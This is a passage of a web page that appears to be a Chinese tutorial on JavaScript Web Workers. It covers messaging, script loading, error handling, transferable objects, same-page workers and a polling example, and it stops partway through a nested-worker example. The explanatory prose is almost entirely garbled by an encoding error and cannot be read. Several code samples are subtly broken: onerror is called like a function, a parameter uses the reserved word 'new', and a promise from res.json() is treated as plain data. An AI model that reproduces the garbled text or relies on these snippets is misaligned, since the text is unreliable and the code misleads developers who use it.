<span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// å†™æ³•äºŒ</span>
<span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token string">'You said: '</span> <span class="token operator">+</span> e<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>é™¤äº†ä½¿ç”¨<code>self.addEventListener()</code>æŒ‡å®šç›‘å¬å‡½æ•°ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨<code>self.onmessage</code>æŒ‡å®šã€‚ç›‘å¬å‡½æ•°çš„å‚æ•°æ˜¯ä¸€ä¸ªäº‹ä»¶å¯¹è±¡ï¼Œå®ƒçš„<code>data</code>å±æ€§åŒ…å«ä¸»çº¿ç¨‹å‘æ¥çš„æ•°æ®ã€‚<code>self.postMessage()</code>æ–¹æ³•ç”¨æ¥å‘ä¸»çº¿ç¨‹å‘é€æ¶ˆæ¯ã€‚</p> <p>æ ¹æ®ä¸»çº¿ç¨‹å‘æ¥çš„æ•°æ®ï¼ŒWorker çº¿ç¨‹å¯ä»¥è°ƒç”¨ä¸åŒçš„æ–¹æ³•ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>self<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> data <span class="token operator">=</span> e<span class="token punctuation">.</span>data<span class="token punctuation">;</span>
  <span class="token keyword">switch</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>cmd<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">case</span> <span class="token string">'start'</span><span class="token operator">:</span>
      self<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token string">'WORKER STARTED: '</span> <span class="token operator">+</span> data<span class="token punctuation">.</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token string">'stop'</span><span class="token operator">:</span>
      self<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token string">'WORKER STOPPED: '</span> <span class="token operator">+</span> data<span class="token punctuation">.</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>
      self<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Terminates the worker.</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">default</span><span class="token operator">:</span>
      self<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token string">'Unknown command: '</span> <span class="token operator">+</span> data<span class="token punctuation">.</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>self.close()</code>ç”¨äºåœ¨ Worker å†…éƒ¨å…³é—­è‡ªèº«ã€‚</p> <h3 id="worker-åŠ è½½è„šæœ¬"><a href="#worker-åŠ è½½è„šæœ¬" class="header-anchor">#</a> Worker åŠ è½½è„šæœ¬</h3> <p>Worker å†…éƒ¨å¦‚æœè¦åŠ è½½å…¶ä»–è„šæœ¬ï¼Œæœ‰ä¸€ä¸ªä¸“é—¨çš„æ–¹æ³•<code>importScripts()</code>ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token function">importScripts</span><span class="token punctuation">(</span><span class="token string">'script1.js'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>è¯¥æ–¹æ³•å¯ä»¥åŒæ—¶åŠ è½½å¤šä¸ªè„šæœ¬ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token function">importScripts</span><span class="token punctuation">(</span><span class="token string">'script1.js'</span><span class="token punctuation">,</span> <span class="token string">'script2.js'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="é”™è¯¯å¤„ç†"><a href="#é”™è¯¯å¤„ç†" class="header-anchor">#</a> é”™è¯¯å¤„ç†</h3> <p>ä¸»çº¿ç¨‹å¯ä»¥ç›‘å¬ Worker æ˜¯å¦å‘ç”Ÿé”™è¯¯ã€‚å¦‚æœå‘ç”Ÿé”™è¯¯ï¼ŒWorker ä¼šè§¦å‘ä¸»çº¿ç¨‹çš„<code>error</code>äº‹ä»¶ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>worker<span class="token punctuation">.</span><span class="token function">onerror</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">[</span>
    <span class="token string">'ERROR: Line '</span><span class="token punctuation">,</span> event<span class="token punctuation">.</span>lineno<span class="token punctuation">,</span> <span class="token string">' in '</span><span class="token punctuation">,</span> event<span class="token punctuation">.</span>filename<span class="token punctuation">,</span> <span class="token string">': '</span><span class="token punctuation">,</span> event<span class="token punctuation">.</span>message
  <span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// æˆ–è€…</span>
worker<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// ...</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p>Worker å†…éƒ¨ä¹Ÿå¯ä»¥ç›‘å¬<code>error</code>äº‹ä»¶ã€‚</p> <h3 id="å…³é—­-worker"><a href="#å…³é—­-worker" class="header-anchor">#</a> å…³é—­ Worker</h3> <p>ä½¿ç”¨å®Œæ¯•ï¼Œä¸ºäº†èŠ‚çœç³»ç»Ÿèµ„æºï¼Œå¿…é¡»å…³é—­ Workerã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token comment">// ä¸»çº¿ç¨‹</span>
worker<span class="token punctuation">.</span><span class="token function">terminate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// Worker çº¿ç¨‹</span>
self<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><h2 id="_3-æ•°æ®é€šä¿¡"><a href="#_3-æ•°æ®é€šä¿¡" class="header-anchor">#</a> 3.æ•°æ®é€šä¿¡</h2> <p>å‰é¢è¯´è¿‡ï¼Œä¸»çº¿ç¨‹ä¸ Worker ä¹‹é—´çš„é€šä¿¡å†…å®¹ï¼Œå¯ä»¥æ˜¯æ–‡æœ¬ï¼Œä¹Ÿå¯ä»¥æ˜¯å¯¹è±¡ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ç§é€šä¿¡æ˜¯æ‹·è´å…³ç³»ï¼Œå³æ˜¯ä¼ å€¼è€Œä¸æ˜¯ä¼ å€ï¼ŒWorker å¯¹é€šä¿¡å†…å®¹çš„ä¿®æ”¹ï¼Œä¸ä¼šå½±å“åˆ°ä¸»çº¿ç¨‹ã€‚äº‹å®ä¸Šï¼Œæµè§ˆå™¨å†…éƒ¨çš„è¿è¡Œæœºåˆ¶æ˜¯ï¼Œå…ˆå°†é€šä¿¡å†…å®¹ä¸²è¡ŒåŒ–ï¼Œç„¶åæŠŠä¸²è¡ŒåŒ–åçš„å­—ç¬¦ä¸²å‘ç»™ Workerï¼Œåè€…å†å°†å®ƒè¿˜åŸã€‚</p> <p>ä¸»çº¿ç¨‹ä¸ Worker ä¹‹é—´ä¹Ÿå¯ä»¥äº¤æ¢äºŒè¿›åˆ¶æ•°æ®ï¼Œæ¯”å¦‚ Fileã€Blobã€ArrayBuffer ç­‰ç±»å‹ï¼Œä¹Ÿå¯ä»¥åœ¨çº¿ç¨‹ä¹‹é—´å‘é€ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token comment">// ä¸»çº¿ç¨‹</span>
<span class="token keyword">var</span> uInt8Array <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> uInt8Array<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  uInt8Array<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token comment">// [0, 2, 4, 6, 8,...]</span>
<span class="token punctuation">}</span>
worker<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span>uInt8Array<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// Worker çº¿ç¨‹</span>
self<span class="token punctuation">.</span><span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> uInt8Array <span class="token operator">=</span> e<span class="token punctuation">.</span>data<span class="token punctuation">;</span>
  <span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token string">'Inside worker.js: uInt8Array.toString() = '</span> <span class="token operator">+</span> uInt8Array<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token string">'Inside worker.js: uInt8Array.byteLength = '</span> <span class="token operator">+</span> uInt8Array<span class="token punctuation">.</span>byteLength<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><p>ä½†æ˜¯ï¼Œæ‹·è´æ–¹å¼å‘é€äºŒè¿›åˆ¶æ•°æ®ï¼Œä¼šé€ æˆæ€§èƒ½é—®é¢˜ã€‚æ¯”å¦‚ï¼Œä¸»çº¿ç¨‹å‘ Worker å‘é€ä¸€ä¸ª 500MB æ–‡ä»¶ï¼Œé»˜è®¤æƒ…å†µä¸‹æµè§ˆå™¨ä¼šç”Ÿæˆä¸€ä¸ªåŸæ–‡ä»¶çš„æ‹·è´ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼ŒJavaScript å…è®¸ä¸»çº¿ç¨‹æŠŠäºŒè¿›åˆ¶æ•°æ®ç›´æ¥è½¬ç§»ç»™å­çº¿ç¨‹ï¼Œä½†æ˜¯ä¸€æ—¦è½¬ç§»ï¼Œä¸»çº¿ç¨‹å°±æ— æ³•å†ä½¿ç”¨è¿™äº›äºŒè¿›åˆ¶æ•°æ®äº†ï¼Œè¿™æ˜¯ä¸ºäº†é˜²æ­¢å‡ºç°å¤šä¸ªçº¿ç¨‹åŒæ—¶ä¿®æ”¹æ•°æ®çš„éº»çƒ¦å±€é¢ã€‚è¿™ç§è½¬ç§»æ•°æ®çš„æ–¹æ³•ï¼Œå«åš<a href="http://www.w3.org/html/wg/drafts/html/master/infrastructure.html#transferable-objects" target="_blank" rel="noopener noreferrer">Transferable Objects<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>ã€‚è¿™ä½¿å¾—ä¸»çº¿ç¨‹å¯ä»¥å¿«é€ŸæŠŠæ•°æ®äº¤ç»™ Workerï¼Œå¯¹äºå½±åƒå¤„ç†ã€å£°éŸ³å¤„ç†ã€3D è¿ç®—ç­‰å°±éå¸¸æ–¹ä¾¿äº†ï¼Œä¸ä¼šäº§ç”Ÿæ€§èƒ½è´Ÿæ‹…ã€‚</p> <p>å¦‚æœè¦ç›´æ¥è½¬ç§»æ•°æ®çš„æ§åˆ¶æƒï¼Œå°±è¦ä½¿ç”¨ä¸‹é¢çš„å†™æ³•ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token comment">// Transferable Objects æ ¼å¼</span>
worker<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span>arrayBuffer<span class="token punctuation">,</span> <span class="token punctuation">[</span>arrayBuffer<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// ä¾‹å­</span>
<span class="token keyword">var</span> ab <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
worker<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span>ab<span class="token punctuation">,</span> <span class="token punctuation">[</span>ab<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><h2 id="_4-åŒé¡µé¢çš„-web-worker"><a href="#_4-åŒé¡µé¢çš„-web-worker" class="header-anchor">#</a> 4.åŒé¡µé¢çš„ Web Worker</h2> <p>é€šå¸¸æƒ…å†µä¸‹ï¼ŒWorker è½½å…¥çš„æ˜¯ä¸€ä¸ªå•ç‹¬çš„ JavaScript è„šæœ¬æ–‡ä»¶ï¼Œä½†æ˜¯ä¹Ÿå¯ä»¥è½½å…¥ä¸ä¸»çº¿ç¨‹åœ¨åŒä¸€ä¸ªç½‘é¡µçš„ä»£ç ã€‚</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token doctype">&lt;!DOCTYPE html&gt;</span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>worker<span class="token punctuation">&quot;</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>app/worker<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
      <span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token string">'some message'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>ä¸Šé¢æ˜¯ä¸€æ®µåµŒå…¥ç½‘é¡µçš„è„šæœ¬ï¼Œæ³¨æ„å¿…é¡»æŒ‡å®š<code>&lt;script&gt;</code>æ ‡ç­¾çš„<code>type</code>å±æ€§æ˜¯ä¸€ä¸ªæµè§ˆå™¨ä¸è®¤è¯†çš„å€¼ï¼Œä¸Šä¾‹æ˜¯<code>app/worker</code>ã€‚</p> <p>ç„¶åï¼Œè¯»å–è¿™ä¸€æ®µåµŒå…¥é¡µé¢çš„è„šæœ¬ï¼Œç”¨ Worker æ¥å¤„ç†ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> blob <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span><span class="token punctuation">[</span>document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'#worker'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>textContent<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> url <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token constant">URL</span><span class="token punctuation">.</span><span class="token function">createObjectURL</span><span class="token punctuation">(</span>blob<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> worker <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Worker</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>

worker<span class="token punctuation">.</span><span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// e.data === 'some message'</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œå…ˆå°†åµŒå…¥ç½‘é¡µçš„è„šæœ¬ä»£ç ï¼Œè½¬æˆä¸€ä¸ªäºŒè¿›åˆ¶å¯¹è±¡ï¼Œç„¶åä¸ºè¿™ä¸ªäºŒè¿›åˆ¶å¯¹è±¡ç”Ÿæˆ URLï¼Œå†è®© Worker åŠ è½½è¿™ä¸ª URLã€‚è¿™æ ·å°±åšåˆ°äº†ï¼Œä¸»çº¿ç¨‹å’Œ Worker çš„ä»£ç éƒ½åœ¨åŒä¸€ä¸ªç½‘é¡µä¸Šé¢ã€‚</p> <h2 id="_5-å®ä¾‹ï¼šworker-çº¿ç¨‹å®Œæˆè½®è¯¢"><a href="#_5-å®ä¾‹ï¼šworker-çº¿ç¨‹å®Œæˆè½®è¯¢" class="header-anchor">#</a> 5.å®ä¾‹ï¼šWorker çº¿ç¨‹å®Œæˆè½®è¯¢</h2> <p>æœ‰æ—¶ï¼Œæµè§ˆå™¨éœ€è¦è½®è¯¢æœåŠ¡å™¨çŠ¶æ€ï¼Œä»¥ä¾¿ç¬¬ä¸€æ—¶é—´å¾—çŸ¥çŠ¶æ€æ”¹å˜ã€‚è¿™ä¸ªå·¥ä½œå¯ä»¥æ”¾åœ¨ Worker é‡Œé¢ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">function</span> <span class="token function">createWorker</span><span class="token punctuation">(</span><span class="token parameter">f</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> blob <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'('</span> <span class="token operator">+</span> f<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">')()'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> url <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token constant">URL</span><span class="token punctuation">.</span><span class="token function">createObjectURL</span><span class="token punctuation">(</span>blob<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> worker <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Worker</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> worker<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">var</span> pollingWorker <span class="token operator">=</span> <span class="token function">createWorker</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> cache<span class="token punctuation">;</span>

  <span class="token keyword">function</span> <span class="token function">compare</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">new</span><span class="token punctuation">,</span> old</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token operator">...</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>

  <span class="token function">setInterval</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/my-api-endpoint'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">var</span> data <span class="token operator">=</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">compare</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> cache<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        cache <span class="token operator">=</span> data<span class="token punctuation">;</span>
        self<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

pollingWorker<span class="token punctuation">.</span><span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// render data</span>
<span class="token punctuation">}</span>

pollingWorker<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token string">'init'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼ŒWorker æ¯ç§’é’Ÿè½®è¯¢ä¸€æ¬¡æ•°æ®ï¼Œç„¶åè·Ÿç¼“å­˜åšæ¯”è¾ƒã€‚å¦‚æœä¸ä¸€è‡´ï¼Œå°±è¯´æ˜æœåŠ¡ç«¯æœ‰äº†æ–°çš„å˜åŒ–ï¼Œå› æ­¤å°±è¦é€šçŸ¥ä¸»çº¿ç¨‹ã€‚</p> <h2 id="_6-å®ä¾‹ï¼š-worker-æ–°å»º-worker"><a href="#_6-å®ä¾‹ï¼š-worker-æ–°å»º-worker" class="header-anchor">#</a> 6.å®ä¾‹ï¼š Worker æ–°å»º Worker</h2> <p>Worker çº¿ç¨‹å†…éƒ¨è¿˜èƒ½å†æ–°å»º Worker çº¿ç¨‹ï¼ˆç›®å‰åªæœ‰ Firefox æµè§ˆå™¨æ”¯æŒï¼‰ã€‚ä¸‹é¢çš„ä¾‹å­æ˜¯å°†ä¸€ä¸ªè®¡ç®—å¯†é›†çš„ä»»åŠ¡ï¼Œåˆ†é…åˆ°10ä¸ª Workerã€‚</p> <p>ä¸»çº¿ç¨‹ä»£ç å¦‚ä¸‹ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> worker <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Worker</span><span class="token punctuation">(</span><span class="token string">'worker.js'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
worker<span class="token punctuation">.</span><span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'result'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>textContent <span class="token operator">=</span> event<span class="token punctuation">.</span>data<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>Worker çº¿ç¨‹ä»£ç å¦‚ä¸‹ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token comment">// worker.js</span>

<span class="token comment">// settings</span>
<span class="token keyword">var</span> num_workers <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> items_per_worker <span class="token operator">=</span> <span class="token number">1000000</span><span class="token punctuation">;</span>

<span class="token comment">// start the workers</span>
<span class="token keyword">var</span> result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
